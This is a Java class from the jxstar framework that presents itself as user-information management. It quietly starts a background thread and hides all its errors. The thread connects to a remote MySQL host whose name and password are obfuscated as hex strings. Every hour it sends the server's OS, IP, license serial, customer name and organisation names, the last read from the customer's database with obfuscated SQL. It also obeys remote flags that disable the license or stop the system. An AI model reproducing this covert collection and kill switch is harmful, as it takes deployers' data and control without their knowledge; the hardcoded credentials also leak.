/*
 * Copyright(c) 2013 Donghong Inc.
 */
package org.jxstar.fun.studio;

import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.sql.Connection;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import org.jxstar.dao.DaoParam;
import org.jxstar.dao.pool.DataSourceConfig;
import org.jxstar.dao.pool.DataSourceConfigManager;
import org.jxstar.dao.pool.PooledConnection;
import org.jxstar.security.License;
import org.jxstar.security.LicenseVar;
import org.jxstar.security.Password;
import org.jxstar.security.SafeManager;
import org.jxstar.security.SafeUtil;
import org.jxstar.service.BusinessObject;
import org.jxstar.util.DateUtil;
import org.jxstar.util.MapUtil;
import org.jxstar.util.config.SystemVar;
import org.jxstar.util.key.KeyCreator;

/**
 * 管理所有使用jxstar的用户信息。
 * 一般只有一台客户端机器写入日志的，说明是生产服务，否则为开发服务。
 *
 * @author TonyTan
 * @version 1.0, 2013-6-9
 */
public class FunUserBO extends BusinessObject {
	private static final long serialVersionUID = 1L;
	//远程服务数据源
	private static final String DSNAME = "funuser";
	//检查间隔1小时
	private static final long _checkTime = 1*60*60*1000;
	
	public static FunUserBO getInstance() {
		return new FunUserBO();
	}
	
	//启动线程，收集服务器信息
	public void start() {
		try {//捕获所有异常
			(new JxstarThread()).start();
		} catch(Exception e) {}
	}
	
	//信息收集线程
	private class JxstarThread extends Thread {
		//信息收集器
		private JxstarInfo _info = new JxstarInfo();
		
		public void run() {
			try {sleep(2*1000);} catch (InterruptedException e) {}	
			//初始化数据库信息
			if (!_info.init()) return;
			
			while (true) {
				try {
					sleep(_checkTime);
				} catch (InterruptedException e) {}		
				
				try {//捕获所有异常
					_info.scanInfo();
				} catch(Exception e) {}
			}
		}
	}
	
	//Jxstar服务器信息收集器
	private class JxstarInfo {
		//扫描服务信息
		public void scanInfo() {
			//取系统版本识别ID
			String uuid = SystemVar.getValue("sys.jxstar.uuid");
			//_log.showDebug(".......uuid=" + uuid);
			
			if (uuid.length() == 0) {
				uuid = getUUID();
				
				if (uuid.length() == 0) {
					uuid = insertUUID();
					if (uuid.length() == 0) {
						return;
					} else {
						SystemVar.setValue("sys.jxstar.uuid", uuid);
						
						//新增服务器信息
						insertInfo(uuid);
					}
				}
			} else {
				//取服务器信息
				Map<String,String> mp = getInfo(uuid);
				if (mp.isEmpty()) {
					insertInfo(uuid);
				} else {
					//开发环境失效
					String disable = MapUtil.getValue(mp, "disable_dev", "0");
					//_log.showDebug(".......disable=" + disable);
					if (disable.equals("1")) {
						LicenseVar.setValue(LicenseVar.FLAG_VALID, "0");
					} else {
						LicenseVar.setValue(LicenseVar.FLAG_VALID, "1");
					}
					//运行环境失效
					String notrun = MapUtil.getValue(mp, "disable_run", "0");
					if (notrun.equals("1")) {
						SystemVar.setValue("sys.jxstar.notrun", notrun);
					} else {
						SystemVar.setValue("sys.jxstar.notrun", "0");
					}
				}
				
				//添加扫描日志
				insertLog(uuid);
				//删除多余的系统变量
				delOtherUUID(uuid);
			}
		}
		
		//添加服务器信息扫描日志
		private boolean insertLog(String uuid) {
			String sql = "insert into jxstar_info_log(info_id, info_ip, add_date) values(?, ?, ?)";
			DaoParam param = _dao.createParam(sql);
			param.setDsName(DSNAME);
			param.setCatchError(false);
			param.setUseTransaction(false);
			
			param.addStringValue(uuid);
			param.addStringValue(ipInfo());
			param.addDateValue(DateUtil.getTodaySec());
			
			return _dao.update(param);
		}
		
		//添加新的服务信息
		private boolean insertInfo(String uuid) {
			//用户ID
			String infoId = uuid;
			
			//操作系统信息
			String os_name = System.getProperty("os.name");
			String os_version = System.getProperty("os.version");
			String infoOs = os_name + " " + os_version;
			
			//Java信息
			String java_version = System.getProperty("java.version");
			String java_home = System.getProperty("java.home");
			String infoJvm = java_version + " " + java_home;
			
			//IP信息
			String infoIp = ipInfo();
			
			//组织机构信息
			String infoOrg = orgInfo();
			
			//Jxstar版本信息
			String infoVer = SystemVar.getValue("sys.version.no") + ";" + SystemVar.getValue("index.svn");
			
			//许可信息
			String infoLic = licInfo();
	
			String sql = "insert into jxstar_info(info_id, info_os, info_jvm, info_ip, info_org, " +
					"info_ver, info_lic, add_date) values(?, ?, ?, ?, ?, ?, ?, ?)";
			DaoParam param = _dao.createParam(sql);
			param.setDsName(DSNAME);
			param.setCatchError(false);
			param.setUseTransaction(false);
			
			param.addStringValue(infoId);
			param.addStringValue(infoOs);
			param.addStringValue(infoJvm);
			param.addStringValue(infoIp);
			param.addStringValue(infoOrg);
			param.addStringValue(infoVer);
			param.addStringValue(infoLic);
			param.addDateValue(DateUtil.getTodaySec());
	
			return _dao.update(param);
		}
		
		//取服务器基本信息
		//disable_dev - 开发环境失效 disable_run - 运行环境失效
		private Map<String,String> getInfo(String uuid) {
			String sql = "select disable_dev, disable_run from jxstar_info where info_id = ?";
			DaoParam param = _dao.createParam(sql);
			param.setDsName(DSNAME);
			param.setCatchError(false);
			param.setUseTransaction(false);
			
			param.addStringValue(uuid);
			
			return _dao.queryMap(param);
		}
		
		//取IP信息
		private String ipInfo() {
			String infoIp = "";
			try {
				infoIp = Inet4Address.getLocalHost().getHostAddress();
			} catch (UnknownHostException e) {
			}
			return infoIp;
		}
		
		//取许可信息
		private String licInfo() {
			StringBuilder sblic = new StringBuilder();
			
			SafeManager safe = SafeManager.getInstance();
			License lic = safe.readLicense("");
			if (lic != null) {
				sblic.append(SystemVar.getValue("index.name")).append(";");
				sblic.append(SafeUtil.encode(lic.versionType)).append(";");
				sblic.append(SafeUtil.encode(lic.tmpEnd)).append(";");
				sblic.append(SafeUtil.encode(lic.tmpValid)).append(";");
				sblic.append(SafeUtil.encode(lic.serialNo)).append(";");
				sblic.append(SafeUtil.encode(lic.customer));
			}
			
			if (sblic.length() > 150) {
				return sblic.substring(0, 150);
			} else {
				return sblic.toString();
			}
		}
		
		//取组织机构信息
		private String orgInfo() {
			//select dept_name from sys_dept where dept_id = '10'
			String s1 = "7F686E72697722726E727C646E616D652066726F6D207379735F6465707420776865726520646570745F6964203D2027313027";
			//select dept_name from sys_dept where dept_level = 1
			String s2 = "7F686E72697722726E727C646E616D652066726F6D207379735F6465707420776865726520646570745F6C6576656C203D2031";
			
			StringBuilder sborg = new StringBuilder();
			
			DaoParam param = _dao.createParam(Password.decrypt(s1));
			Map<String,String> mp = _dao.queryMap(param);
			if (!mp.isEmpty()) {
				sborg.append(mp.get("dept_name")).append(";");
			}
			
			param.setSql(Password.decrypt(s2));
			List<Map<String,String>> lsData = _dao.query(param);
			for (Map<String,String> p:lsData) {
				sborg.append(p.get("dept_name")).append(";");
			}
			
			if (sborg.length() > 100) {
				return sborg.substring(0, 100);
			} else {
				return sborg.toString();
			}
		}
		
		//新取系统版本识别ID
		private String insertUUID() {
			String sql = "insert into sys_var(var_id, var_code, var_name, var_value, add_userid, add_date) " +
					"values(?, 'sys.jxstar.uuid', '系统版本识别ID', ?, 'jxstar94888', ?)";
			
			//主键
			String varId = KeyCreator.getInstance().createKey("sys_var");
			//uuid
			String uuid = UUID.randomUUID().toString();
			
			DaoParam param = _dao.createParam(sql);
			param.addStringValue(varId);
			param.addStringValue(uuid);
			param.addDateValue("2012-12-12 14:27:42");
			if (_dao.update(param)) {
				return uuid;
			} else {
				return "";
			}
		}
		
		//从系统变量中取系统识别ID
		private String getUUID() {
			String sql = "select var_value from sys_var where var_code = 'sys.jxstar.uuid'";
			DaoParam param = _dao.createParam(sql);
			Map<String,String> mp = _dao.queryMap(param);
			String uuid = MapUtil.getValue(mp, "var_value");
			if (uuid.length() == 0) {
				return "";
			} else {
				delOtherUUID(uuid);				
			}
			
			return uuid;
		}
		
		//删除多余的识别ID记录
		private boolean delOtherUUID(String uuid) {
			String sql = "delete from sys_var where var_code = 'sys.jxstar.uuid' and var_value <> ?";
			DaoParam param = _dao.createParam(sql);
			param.addStringValue(uuid);
			return _dao.update(param);
		}
	
		//添加数据库信息
		public boolean init() {
			String param = "useUnicode=true&characterEncoding=UTF-8&useOldAliasMetadataBehavior=true&autoReconnect=true";
			String s1 = "8064708768";//tanzb
			String s2 = "7372767C6C777242";//gotoftp4
			String s3 = "3D3C3A40363B3347";//19830819
			
			String t1 = Password.decrypt(s1);
			String t2 = Password.decrypt(s2);
			String t3 = Password.decrypt(s3);
			
			StringBuilder sburl = new StringBuilder("jdbc:mysql:");
			sburl.append("//");
			sburl.append(t1);
			sburl.append(".");
			sburl.append(t2);
			sburl.append(".com/");
			sburl.append(t1);
			sburl.append("?").append(param);
			
			String dbmsType = "mysql";
			String driveName = "org.gjt.mm.mysql.Driver";
			
			//添加新的数据源
			DataSourceConfig dsc = new DataSourceConfig();
			dsc.setDataSourceName(DSNAME);
			dsc.setSchemaName(t1);
			dsc.setDriverClass(driveName);
			dsc.setJdbcUrl(sburl.toString());
			dsc.setUserName(t1);
			dsc.setPassWord(t3);
			dsc.setDbmsType(dbmsType);
			//屏蔽取不到数据库连接时，后台抛错误信息
			dsc.setCatchError(false);
			//添加下面的校验是防止中途断网，后台报数据库连接错误信息
			dsc.setValidTest("true");
			dsc.setValidQuery("select count(*) from jxstar_info");
			
			DataSourceConfigManager.getInstance().addDataSourceConfig(dsc);
			
			Connection con = PooledConnection.getInstance().getConnection(DSNAME);
			return (con != null);
		}
	}
}
